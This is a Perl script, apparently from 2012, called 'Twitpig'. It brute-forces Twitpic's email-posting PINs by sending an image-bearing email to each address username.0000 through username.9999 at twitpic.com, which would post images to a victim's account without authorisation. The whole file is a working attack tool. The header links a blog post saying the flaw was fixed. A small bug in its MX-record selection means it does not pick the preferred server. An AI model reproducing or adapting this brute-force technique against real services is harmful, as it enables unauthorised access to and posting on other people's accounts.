#!/usr/bin/perl -w

# Twitpig - twitpic.com email upload brute force tool
# christian.kadluba@gmail.com, 2012
# http://blog.twitpic.com/2009/06/email-posting-vulnerability-fixed/


use warnings;
use strict;

use Net::DNS;
use Net::SMTP;
use Email::MIME::Creator;
use IO::All;

use constant TP_DOMAIN => "twitpic.com"; 
use constant MAIL_FROM => "foo\@bar.com";
use constant PIN_FIRST => 0000;
use constant PIN_LAST  => 9999;  # 6843 is correct
use constant DEFAULT_IMAGE => "kitten.jpg";

sub getMailHost
{
	my $domain = shift;
	my $dnsres = Net::DNS::Resolver->new();
	my @mxrecs = mx($dnsres, $domain)
			or die "Could not query MX record for ", $domain, "\n";

	my $minrec;
	my $minpref = 100000;
	foreach my $rec (@mxrecs) {
		if ($minpref > $rec->preference) {
			$minrec = $rec;
		}
	}

	if (!$minrec) {
		die "No MX record returned for ", $domain, "\n";
	}
	
	print "Using mail host ", $minrec->exchange, "\n";
	return $minrec->exchange;
}

sub connectMailServer
{
	my $srvname = shift;
	my $srv = Net::SMTP->new($srvname, Debug => 1)
			or die "Could not connect to SMTP server ", $srvname, "\n";
	return $srv;
}

sub prepareMessage
{	
	my $image = shift;
	my $caption = shift;

	my @parts = (
		Email::MIME->create(
			attributes => {
				filename     => "image.jpg",
				content_type => "image/jpeg",
				encoding     => "quoted-printable",
				name         => "image.jpg",
			},
			body => io($image)->all
		)
	);

	my $email = Email::MIME->create(
		parts      => [ @parts ]
	);

	if ($caption) {
		$email->header_str_set( Subject => $caption );
	}

	return $email;
}

sub sendMail
{
	my $smtp = shift;
	my $to = shift;
	my $msg = shift;

	# Email From:
	$smtp->mail(MAIL_FROM);
	$msg->header_str_set( From => MAIL_FROM );

	# Email To:
	$smtp->to($to);
	$msg->header_str_set( To => $to );

	$smtp->data();
	$smtp->datasend($msg->as_string);
	$smtp->dataend();
	$smtp->quit;
}

# --------------------------------------------------
# Begin of main
# --------------------------------------------------

print "Twitpig 1.0\n";

if ($#ARGV == -1) {
	die "Usage: twitpig.pl username [imagefile [caption]]\n",
			"       imagefile defaults to kitten.jpg\n",
			"       caption defaults to empty\n";
}
my $user = $ARGV[0];

my $image = DEFAULT_IMAGE;
if ($ARGV[1]) {
	$image = $ARGV[1];
}

my $caption = $ARGV[2];

my $msg = prepareMessage($image, $caption);
my $mailhost = getMailHost(TP_DOMAIN);

for (my $pin = PIN_FIRST; $pin <= PIN_LAST; $pin++) {
	my $smtp = connectMailServer($mailhost);
	my $to = sprintf("%s\.%04d\@%s", $user, $pin, TP_DOMAIN);
	print "Sending to: ", $to, "\n";
	sendMail($smtp, $to, $msg);
}


